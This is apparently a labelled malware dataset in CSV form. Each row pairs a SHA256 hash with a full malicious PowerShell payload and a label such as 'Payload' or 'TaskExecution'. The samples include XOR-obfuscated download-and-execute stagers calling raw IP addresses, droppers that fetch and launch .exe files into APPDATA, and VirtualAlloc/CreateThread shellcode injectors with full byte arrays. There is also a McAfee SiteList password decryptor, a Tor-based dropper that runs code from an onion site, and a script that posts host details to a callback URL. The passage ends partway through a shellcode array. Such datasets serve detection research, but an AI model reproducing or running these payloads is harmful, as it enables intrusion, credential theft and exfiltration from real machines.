SHA256,Full Payload,Label
fc5f13c4935636fa24b471e989f0fef701c6293a85211cefb5f78ce13902df53,"
$wc=NeW-ObjECT SysTeM.NEt.WEbCLIEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wc.HeaDERs.ADd('User-Agent',$u);$WC.ProXy = [SySteM.NET.WebReqUEST]::DefAuLtWebPRoxY;$WC.PrOXy.CREdENTIals = [System.Net.CredeNTiAlCacHe]::DefAUltNEtwOrKCRedEnTiALS;$K='4D>`]7XLkteWAwo^mx_PTv3{a2MG)?zZ';$i=0;[cHaR[]]$b=([char[]]($Wc.DOWnLOadStrinG(""https://10.0.85.135:53/index.asp"")))|%{$_-bXOr$k[$I++%$k.LEnGtH]};IEX ($b-Join'')

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
c9a4763abe995c1836c3b2bf0a9bb76b55b57e54c1a5b17b3faf3694786aed19,"
[System.Net.SeRViCePoiNTMAnAgeR]::EXpEcT100COnTINUe = 0;$Wc=New-ObJecT System.Net.WEBClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wc.HEadERs.ADD('User-Agent',$u);$wC.PROXY = [SYStEM.Net.WEBREqUEsT]::DEFAUltWEbPROXY;$wC.ProxY.CreDeNTiALs = [SySTeM.NEt.CreDEntiaLCAche]::DeFaULTNEtwOrKCredENtiaLs;$K='=NV1SZp0ir$J+]mlF/(Q;yL9HR8|)MX&';$i=0;[cHAR[]]$b=([char[]]($Wc.DoWNlOADStrIng(""https://93.176.84.34:443/index.asp"")))|%{$_-BXOR$k[$i++%$k.LENGth]};IEX ($B-jOin'')

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
09af554f88850c5beb4f3ce2631f4e49552e0482890e16dc7e57a500aabf4472,"
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',""$env:APPDATA\msvmonr.exe"");Start-Process (""$env:APPDATA\msvmonr.exe"")

",Payload
fe45baeb68889abecd37331fe6ef0401fa1aab00fc9859a359a70fe832002ce4,"function Get-SiteListPassword {


    [CmdletBinding()]
    param(
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $SiteListFilePath
    )

    function Get-DecryptedSitelistPassword {
        
        
        
        [CmdletBinding()]
        Param (
            [Parameter(Mandatory = $True)]
            [String]
            $B64Pass
        )

        
        Add-Type -assembly System.Security
        Add-Type -assembly System.Core

        
        $Encoding = [System.Text.Encoding]::ASCII
        $SHA1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider 
        $3DES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider

        
        $XORKey = 0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19

        
        $I = 0;
        $UnXored = [System.Convert]::FromBase64String($B64Pass) | Foreach-Object { $_ -BXor $XORKey[$I++ % $XORKey.Length] }

        
        $3DESKey = $SHA1.ComputeHash($Encoding.GetBytes('<!@

        
        $3DES.Mode = 'ECB'
        $3DES.Padding = 'None'
        $3DES.Key = $3DESKey

        
        $Decrypted = $3DES.CreateDecryptor().TransformFinalBlock($UnXored, 0, $UnXored.Length)

        
        $Index = [Array]::IndexOf($Decrypted, [Byte]0)
        if($Index -ne -1) {
            $DecryptedPass = $Encoding.GetString($Decrypted[0..($Index-1)])
        }
        else {
            $DecryptedPass = $Encoding.GetString($Decrypted)
        }

        New-Object -TypeName PSObject -Property @{'Encrypted'=$B64Pass;'Decrypted'=$DecryptedPass}
    }

    function Get-SitelistFields {
        [CmdletBinding()]
        Param (
            [Parameter(Mandatory = $True)]
            [String]
            $Path
        )

        try {
            [Xml]$SiteListXml = Get-Content -Path $Path

            if($SiteListXml.InnerXml -Like ""*password*"") {
                Write-Verbose ""Potential password in found in $Path""

                $SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {                    
                    try {
                        $PasswordRaw = $_.Password.'

                        if($_.Password.Encrypted -eq 1) {
                            
                            $DecPassword = if($PasswordRaw) { (Get-DecryptedSitelistPassword -B64Pass $PasswordRaw).Decrypted } else {''}
                        }
                        else {
                            $DecPassword = $PasswordRaw
                        }

                        $Server = if($_.ServerIP) { $_.ServerIP } else { $_.Server }
                        $Path = if($_.ShareName) { $_.ShareName } else { $_.RelativePath }

                        $ObjectProperties = @{
                            'Name' = $_.Name;
                            'Enabled' = $_.Enabled;
                            'Server' = $Server;
                            'Path' = $Path;
                            'DomainName' = $_.DomainName;
                            'UserName' = $_.UserName;
                            'EncPassword' = $PasswordRaw;
                            'DecPassword' = $DecPassword;
                        }
                        New-Object -TypeName PSObject -Property $ObjectProperties
                    }
                    catch {
                        Write-Debug ""Error parsing node : $_""
                    }
                }
            }
        }
        catch {
            Write-Error $_
        }
    }

    if($SiteListFilePath) {
        $XmlFiles = Get-ChildItem -Path $SiteListFilePath
    }
    else {
        $XmlFiles = 'C:\Program Files\','C:\Program Files (x86)\','C:\Documents and Settings\','C:\Users\' | Foreach-Object {
            Get-ChildItem -Path $_ -Recurse -Include 'SiteList.xml' -ErrorAction SilentlyContinue
        }
    }

    $XmlFiles | Where-Object { $_ } | Foreach-Object {
        Write-Verbose ""Parsing SiteList.xml file '$($_.Fullname)'""
        Get-SitelistFields -Path $_.Fullname        
    }
}
",Payload
535455fd2b98fff0f3607b309dc7e45518d46d7416687f544e9abdfa48d481cb,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x1d,0xa0,0x86,0x2f,0xd9,0xca,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x45,0x0f,0x03,0x45,0x12,0x42,0x73,0xd3,0xc4,0x00,0x7c,0x2c,0x14,0x65,0xf4,0xc9,0x25,0xa5,0x62,0x99,0x15,0x15,0xe0,0xcf,0x99,0xde,0xa4,0xfb,0x2a,0x92,0x60,0x0b,0x9b,0x19,0x57,0x22,0x1c,0x31,0xab,0x25,0x9e,0x48,0xf8,0x85,0x9f,0x82,0x0d,0xc7,0xd8,0xff,0xfc,0x95,0xb1,0x74,0x52,0x0a,0xb6,0xc1,0x6f,0xa1,0x84,0xc4,0xf7,0x56,0x5c,0xe6,0xd6,0xc8,0xd7,0xb1,0xf8,0xeb,0x34,0xca,0xb0,0xf3,0x59,0xf7,0x0b,0x8f,0xa9,0x83,0x8d,0x59,0xe0,0x6c,0x21,0xa4,0xcd,0x9e,0x3b,0xe0,0xe9,0x40,0x4e,0x18,0x0a,0xfc,0x49,0xdf,0x71,0xda,0xdc,0xc4,0xd1,0xa9,0x47,0x21,0xe0,0x7e,0x11,0xa2,0xee,0xcb,0x55,0xec,0xf2,0xca,0xba,0x86,0x0e,0x46,0x3d,0x49,0x87,0x1c,0x1a,0x4d,0xcc,0xc7,0x03,0xd4,0xa8,0xa6,0x3c,0x06,0x13,0x16,0x99,0x4c,0xb9,0x43,0x90,0x0e,0xd5,0xa0,0x99,0xb0,0x25,0xaf,0xaa,0xc3,0x17,0x70,0x01,0x4c,0x1b,0xf9,0x8f,0x8b,0x5c,0xd0,0x68,0x03,0xa3,0xdb,0x88,0x0d,0x67,0x8f,0xd8,0x25,0x4e,0xb0,0xb2,0xb5,0x6f,0x65,0x2e,0xb3,0xe7,0x46,0x07,0xba,0xf5,0x2e,0x5a,0xbd,0xf8,0x15,0xd3,0x5b,0xaa,0x39,0xb4,0xf3,0x0a,0xea,0x74,0xa4,0xe2,0xe0,0x7a,0x9b,0x12,0x0b,0x51,0xb4,0xb8,0xe4,0x0c,0xec,0x54,0x9c,0x14,0x66,0xc5,0x61,0x83,0x02,0xc5,0xea,0x20,0xf2,0x8b,0x1a,0x4c,0xe0,0x7b,0xeb,0x1b,0x5a,0x2d,0xf4,0xb1,0xf1,0xd1,0x60,0x3e,0x50,0x86,0x1c,0x3c,0x85,0xe0,0x82,0xbf,0xe0,0x7b,0x0a,0x2a,0x4b,0x13,0x73,0xba,0x4b,0xe3,0x25,0xd0,0x4b,0x8b,0x91,0x80,0x1f,0xae,0xdd,0x1c,0x0c,0x63,0x48,0x9f,0x65,0xd0,0xdb,0xf7,0x8b,0x0f,0x2b,0x58,0x73,0x7a,0xad,0xa4,0xa2,0x42,0xdb,0xc4,0x76;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
dfeb12e1da892094af79329471023b97ab7d26a03e8c2ca8d1fd93ae5091f33f,"
$EtZR = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $EtZR -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x46,0x10,0x14,0xea,0xdd,0xc1,0xd9,0x74,0x24,0xf4,0x5f,0x31,0xc9,0xb1,0x47,0x31,0x47,0x13,0x83,0xef,0xfc,0x03,0x47,0x49,0xf2,0xe1,0x16,0xbd,0x70,0x09,0xe7,0x3d,0x15,0x83,0x02,0x0c,0x15,0xf7,0x47,0x3e,0xa5,0x73,0x05,0xb2,0x4e,0xd1,0xbe,0x41,0x22,0xfe,0xb1,0xe2,0x89,0xd8,0xfc,0xf3,0xa2,0x19,0x9e,0x77,0xb9,0x4d,0x40,0x46,0x72,0x80,0x81,0x8f,0x6f,0x69,0xd3,0x58,0xfb,0xdc,0xc4,0xed,0xb1,0xdc,0x6f,0xbd,0x54,0x65,0x93,0x75,0x56,0x44,0x02,0x0e,0x01,0x46,0xa4,0xc3,0x39,0xcf,0xbe,0x00,0x07,0x99,0x35,0xf2,0xf3,0x18,0x9c,0xcb,0xfc,0xb7,0xe1,0xe4,0x0e,0xc9,0x26,0xc2,0xf0,0xbc,0x5e,0x31,0x8c,0xc6,0xa4,0x48,0x4a,0x42,0x3f,0xea,0x19,0xf4,0x9b,0x0b,0xcd,0x63,0x6f,0x07,0xba,0xe0,0x37,0x0b,0x3d,0x24,0x4c,0x37,0xb6,0xcb,0x83,0xbe,0x8c,0xef,0x07,0x9b,0x57,0x91,0x1e,0x41,0x39,0xae,0x41,0x2a,0xe6,0x0a,0x09,0xc6,0xf3,0x26,0x50,0x8e,0x30,0x0b,0x6b,0x4e,0x5f,0x1c,0x18,0x7c,0xc0,0xb6,0xb6,0xcc,0x89,0x10,0x40,0x33,0xa0,0xe5,0xde,0xca,0x4b,0x16,0xf6,0x08,0x1f,0x46,0x60,0xb9,0x20,0x0d,0x70,0x46,0xf5,0x82,0x20,0xe8,0xa6,0x62,0x91,0x48,0x17,0x0b,0xfb,0x47,0x48,0x2b,0x04,0x82,0xe1,0xc6,0xfe,0x44,0xce,0xbf,0x0f,0x17,0xa6,0xbd,0x0f,0x06,0xf6,0x4b,0xe9,0x42,0xe8,0x1d,0xa1,0xfa,0x91,0x07,0x39,0x9b,0x5e,0x92,0x47,0x9b,0xd5,0x11,0xb7,0x55,0x1e,0x5f,0xab,0x01,0xee,0x2a,0x91,0x87,0xf1,0x80,0xbc,0x27,0x64,0x2f,0x17,0x70,0x10,0x2d,0x4e,0xb6,0xbf,0xce,0xa5,0xcd,0x76,0x5b,0x06,0xb9,0x76,0x8b,0x86,0x39,0x21,0xc1,0x86,0x51,0x95,0xb1,0xd4,0x44,0xda,0x6f,0x49,0xd5,0x4f,0x90,0x38,0x8a,0xd8,0xf8,0xc6,0xf5,0x2f,0xa7,0x39,0xd0,0xb1,0x9b,0xef,0x1c,0xc4,0xf5,0x33;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$cRl=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($cRl.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$cRl,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
0b3066d1e171e168973179c4397aa99ecca50102f289d742e01092f275cc820e,"
$Wc=NEW-ObJeCT SySTem.Net.WeBClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEAderS.Add('User-Agent',$u);$Wc.PrOXY = [SYSteM.NeT.WEBREQUESt]::DeFAULTWEBPrOXy;$Wc.PRoXy.CreDeNTiaLs = [SYSTeM.NEt.CreDeNtIalCacHE]::DeFaultNeTWorKCReDENtialS;$K='/j(\wly4+aW

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
b8884ec2482672423bc4ad1015b94b5f9cdb335dc2ccb8feac079e5886ecc332,"
'AnPaAPFbyy';$ErrorActionPreference = 'SilentlyContinue';'xThnLWHOYX';'BUxsOWlj';$ckov = (get-wmiobject Win32_ComputerSystemProduct).UUID;'VeaB';'AKSPDTe';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run) -match $ckov){;'LZNELAa';'oxOOIjBw';(Get-Process -id $pid).Kill();'siguXh';'xcBDSShDh';};'MzWAhyLo';'iPeT';function e($xmg){;'NbVYubgNi';'ZLauAWN';$uf = (((iex ""nslookup -querytype=txt $xmg 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'JTYVLq';'BZkguQ';$hjwh.DownloadFile($uf, $pzzn);'qBbYTSA';'TpjBOLf';$tgj = $yhdh.NameSpace($pzzn).Items();'UtizioM';'kqXMeb';$yhdh.NameSpace($sk).CopyHere($tgj, 20);'VMdyPuyTQI';'ifVLd';rd $pzzn;'NlyDYpgGTB';'lfZJqwnG';};'JK';'FogK';'wYTkGFcdLP';'sxRHUws';'qaKift';'hXJhjzXBfwr';$sk = $env:APPDATA + '\' + $ckov;'RKxeVi';'uHIzODeeDU';if (!(Test-Path $sk)){;'jCMZqGTbnq';'qFcJkCqpi';$gbj = New-Item -ItemType Directory -Force -Path $sk;'iEn';'vhnVY';$gbj.Attributes = ""Hidden"", ""System"", ""NotContentIndexed"";'SrsMaYsv';'lKGyyQp';};'fhSzDOfA';'OErIwn';'jIjy';'mTRqJIH';$lb=$sk+ '\tor.exe';'IPepjId';'rkLluBxOCEC';$khfu=$sk+ '\polipo.exe';'cBrzGkUO';'QQc';$pzzn=$sk+'\'+$ckov+'.zip';'TrXj';'amvhzHSu';$hjwh=New-Object System.Net.WebClient;'SeUfCgzj';'jpymtAhmI';$yhdh=New-Object -C Shell.Application;'aIKmTYBlW';'IbUSFJomNVD';'JTG';'Nt';if (!(Test-Path $lb) -or !(Test-Path $khfu)){;'vod';'SkxcYT';e 'i.vankin.de';'WpPGZvyDN';'EqfhMv';};'QxUZSu';'QGo';'xbqpFPYPnvP';'oy';if (!(Test-Path $lb) -or !(Test-Path $khfu)){;'BIEaI';'OhfnBeRVnN';e 'gg.ibiz.cc';'NN';'zcdlKafklzw';};'UXYXOfhpO';'CYkFJ';'mLr';'EUHifQEeNh';$thbv=$sk+'\roaminglog';'rxlscEVXb';'wDxZmjLcvNP';saps $lb -Ar "" --Log `""notice file $thbv`"""" -wi Hidden;'oDZLMXLplOJ';'CqQQUYkN';do{sleep 1;$uy=gc $thbv}while(!($uy -match 'Bootstrapped 100%: Done.'));'SRjoZKP';'eRWtrbjy';saps $khfu -a ""socksParentProxy=localhost:9050"" -wi Hidden;'EkHIrNI';'WzkXtC';sleep 7;'MoievMb';'qOHIrJWg';$nra=New-Object System.Net.WebProxy(""localhost:8123"");'ZjxfCL';'IVOUKIm';$nra.useDefaultCredentials = $true;'otTgCpy';'SoRyTuTWB';$hjwh.proxy=$nra;'pLGc';'WuVFJj';$pj='http://powerwormjqj42hu.onion/get.php?s=setup&mom=4C4C4544-004D-5110-8035-C6C04F463253&uid=' + $ckov;'BO';'HUclPRLMdbp';while(!$bm){$bm=$hjwh.downloadString($pj)};'beegAUp';'pGY';if ($bm -ne 'none'){;'zbkaxm';'xPYEweCmgQ';iex $bm;'gwEVdBB';'NDsCwRmsFr';};'zJNCCx';

",TaskExecution
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
42eb1c595240f6c35d3ff0d2889f569031c2e17a51b94be24c680e843e0c4d3a,"
$user = whoami
$ip = ipconfig /all | out-string
$wmi = Get-WmiObject -Class Win32_ComputerSystem | out-string 


$temp  = [System.Text.Encoding]::UTF8.GetBytes($user)
$userEnc = [System.Convert]::ToBase64String($temp)
$temp  = [System.Text.Encoding]::UTF8.GetBytes($ip)
$ipEnc = [System.Convert]::ToBase64String($temp)
$temp  = [System.Text.Encoding]::UTF8.GetBytes($wmi)
$wmiEnc = [System.Convert]::ToBase64String($temp)

$url = ""https://callback.1cn.ca/information.html""

$NVC = New-Object System.Collections.Specialized.NameValueCollection
$NVC.Add(""U"", $userEnc)
$NVC.Add(""I"", $ipEnc)
$NVC.Add(""W"", $wmiEnc)

$wc = New-Object System.Net.WebClient     
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$wc.UploadValues($URL,""post"", $NVC)

",TaskExecution
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
ba854bbeea607a04c07a4d0e900692c495771cdb8f299bade0728fa592b637a3,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = ;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7acb2b6e86de1a4427bfa37f74f523dfbc651e011e7836915797eeec504c3c2d,"
$wC=NEW-OBJEcT SyStEm.NET.WEbCLiENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEaDeRs.AdD('User-Agent',$u);$wC.PROXY = [SySTem.NEt.WEbReQUEst]::DeFAulTWEbPrOXY;$Wc.PRoxY.CrEDENTIaLs = [SYstEm.NEt.CreDEntIalCAche]::DEFAulTNEtWorKCrEdeNtIAlS;$K='?$~tvolIm%(f31,^E2.|d9Bgj@:s8D_7';$I=0;[cHar[]]$B=([char[]]($WC.DOwnLOAdSTRiNG(""http://23.116.90.9:80/index.asp"")))|%{$_-BXoR$K[$I++%$K.LeNgTh]};IEX ($B-jOIn'')

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
445a4e81ad763a4fa2ed1f6744b2028358ff8d70945433659a9bcad5dc0cb640,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
2ea2d10b24d5bab36d4bd5f7a927489ec51a60713cbbfe13c26fa37d9efeaf2b,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x67,0x68,0x02,0x00,0x02,0x9a,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58